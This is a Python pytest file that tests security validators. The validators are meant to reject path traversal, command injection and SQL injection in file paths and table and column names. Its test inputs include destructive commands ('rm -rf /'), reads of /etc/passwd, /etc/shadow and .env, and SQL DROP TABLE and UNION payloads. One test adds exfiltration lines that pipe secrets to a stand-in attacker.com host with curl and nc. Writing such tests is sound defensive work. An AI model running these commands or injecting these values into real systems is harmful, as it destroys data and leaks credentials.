"""
Unit tests for security validation helpers.
Tests path traversal prevention, SQL injection prevention, and input validation.
"""

import pytest
from pathlib import Path
from Engine8_Knowledge.utils.security_validators import (
    validate_file_path,
    validate_table_name,
    validate_column_name,
    SecurityValidationError,
    BD_ALLOWED_TABLES,
)


class TestValidateFilePath:
    """Test file path validation and path traversal prevention."""
    
    def test_valid_relative_path(self):
        """Valid relative path within allowed directory."""
        path = validate_file_path("outputs/jobs.csv")
        assert path.is_absolute()
        assert "outputs" in str(path)
    
    def test_path_traversal_dotdot(self):
        """Block path traversal with ../"""
        with pytest.raises(SecurityValidationError, match="Path traversal detected"):
            validate_file_path("../../../etc/passwd")
    
    def test_path_traversal_absolute(self):
        """Block absolute paths."""
        with pytest.raises(SecurityValidationError, match="Path traversal detected"):
            validate_file_path("/etc/passwd")
    
    def test_command_injection_chars(self):
        """Block special characters that enable command injection."""
        malicious_paths = [
            "outputs/jobs.csv; rm -rf /",
            "outputs/jobs.csv | cat /etc/passwd",
            "outputs/jobs.csv && whoami",
            "outputs/jobs.csv`whoami`",
            "outputs/$(whoami).csv",
            "outputs/jobs.csv > /dev/null",
        ]
        for path in malicious_paths:
            with pytest.raises(SecurityValidationError, match="Invalid characters"):
                validate_file_path(path)
    
    def test_empty_path(self):
        """Reject empty or None path."""
        with pytest.raises(SecurityValidationError, match="non-empty string"):
            validate_file_path("")
        
        with pytest.raises(SecurityValidationError, match="non-empty string"):
            validate_file_path(None)
    
    def test_file_extension_whitelist(self):
        """Enforce file extension whitelist when provided."""
        # Should pass
        validate_file_path("outputs/jobs.csv", allowed_extensions=[".csv", ".json"])
        
        # Should fail
        with pytest.raises(SecurityValidationError, match="extension.*not allowed"):
            validate_file_path("outputs/script.sh", allowed_extensions=[".csv", ".json"])
    
    def test_custom_allowed_directory(self):
        """Allow custom directory whitelist."""
        custom_dir = Path(__file__).parent.parent / "custom_outputs"
        custom_dir.mkdir(exist_ok=True)
        
        # Should pass
        path = validate_file_path("custom_outputs/test.csv", allowed_directories=[custom_dir])
        assert path.is_absolute()
        
        # Should fail for path outside custom directory
        with pytest.raises(SecurityValidationError, match="outside allowed directories"):
            validate_file_path("outputs/jobs.csv", allowed_directories=[custom_dir])


class TestValidateTableName:
    """Test SQL table name validation."""
    
    def test_valid_table_names(self):
        """Accept valid SQL identifier patterns."""
        valid_names = ["jobs", "contacts", "programs", "call_notes", "Job_Postings", "_internal"]
        for name in valid_names:
            assert validate_table_name(name) == name
    
    def test_sql_injection_attempts(self):
        """Block SQL injection patterns."""
        injection_attempts = [
            "jobs; DROP TABLE users;",
            "jobs--",
            "jobs/*comment*/",
            "jobs UNION SELECT",
            "jobs' OR '1'='1",
            "jobs\"; DROP TABLE contacts;--",
        ]
        for name in injection_attempts:
            with pytest.raises(SecurityValidationError, match="Invalid table name"):
                validate_table_name(name)
    
    def test_table_name_starting_with_number(self):
        """SQL identifiers can't start with numbers."""
        with pytest.raises(SecurityValidationError, match="Invalid table name"):
            validate_table_name("123_table")
    
    def test_special_characters(self):
        """Block special characters except underscore."""
        invalid_names = ["jobs-table", "jobs.table", "jobs@table", "jobs$table", "jobs table"]
        for name in invalid_names:
            with pytest.raises(SecurityValidationError, match="Invalid table name"):
                validate_table_name(name)
    
    def test_whitelist_enforcement(self):
        """Enforce allowed tables whitelist when provided."""
        whitelist = ["jobs", "contacts", "programs"]
        
        # Should pass
        assert validate_table_name("jobs", allowed_tables=whitelist) == "jobs"
        
        # Should fail
        with pytest.raises(SecurityValidationError, match="not in allowed list"):
            validate_table_name("malicious_table", allowed_tables=whitelist)
    
    def test_empty_table_name(self):
        """Reject empty table name."""
        with pytest.raises(SecurityValidationError, match="non-empty string"):
            validate_table_name("")
    
    def test_bd_allowed_tables_constant(self):
        """Verify BD_ALLOWED_TABLES constant contains expected tables."""
        assert "jobs" in BD_ALLOWED_TABLES
        assert "contacts" in BD_ALLOWED_TABLES
        assert "programs" in BD_ALLOWED_TABLES
        assert "relationships" in BD_ALLOWED_TABLES


class TestValidateColumnName:
    """Test SQL column name validation."""
    
    def test_valid_column_names(self):
        """Accept valid column identifiers."""
        valid_names = ["id", "full_name", "created_at", "data_quality_score", "job.title"]
        for name in valid_names:
            assert validate_column_name(name) == name
    
    def test_qualified_column_names(self):
        """Accept table-qualified column names (table.column)."""
        assert validate_column_name("jobs.title") == "jobs.title"
        assert validate_column_name("contacts.email") == "contacts.email"
    
    def test_sql_injection_in_column(self):
        """Block SQL injection in column names."""
        injection_attempts = [
            "id; DROP TABLE users;",
            "id--",
            "id OR 1=1",
            "id' UNION SELECT password FROM users--",
        ]
        for name in injection_attempts:
            with pytest.raises(SecurityValidationError, match="Invalid column name"):
                validate_column_name(name)
    
    def test_empty_column_name(self):
        """Reject empty column name."""
        with pytest.raises(SecurityValidationError, match="non-empty string"):
            validate_column_name("")


class TestIntegrationScenarios:
    """Integration tests simulating real attack scenarios."""
    
    def test_path_traversal_attack_scenario(self):
        """Simulate attacker trying to read /etc/passwd via pipeline trigger."""
        malicious_inputs = [
            "../../../../etc/passwd",
            "../../../.env",
            "outputs/../../.env",
            "/etc/shadow",
        ]
        for attack_input in malicious_inputs:
            with pytest.raises(SecurityValidationError):
                validate_file_path(attack_input)
    
    def test_sql_injection_attack_scenario(self):
        """Simulate attacker trying to inject SQL via table name."""
        # Bobby Tables attack
        malicious_table = "students'; DROP TABLE students;--"
        with pytest.raises(SecurityValidationError):
            validate_table_name(malicious_table)
        
        # UNION-based injection
        malicious_table2 = "jobs UNION SELECT password FROM users"
        with pytest.raises(SecurityValidationError):
            validate_table_name(malicious_table2)
    
    def test_command_injection_via_filename(self):
        """Simulate command injection via crafted filename."""
        malicious_files = [
            "jobs.csv; curl http://attacker.com/steal?data=$(cat .env)",
            "jobs.csv`curl http://evil.com`",
            "jobs.csv && cat /etc/passwd | nc attacker.com 1234",
        ]
        for attack_file in malicious_files:
            with pytest.raises(SecurityValidationError):
                validate_file_path(attack_file)
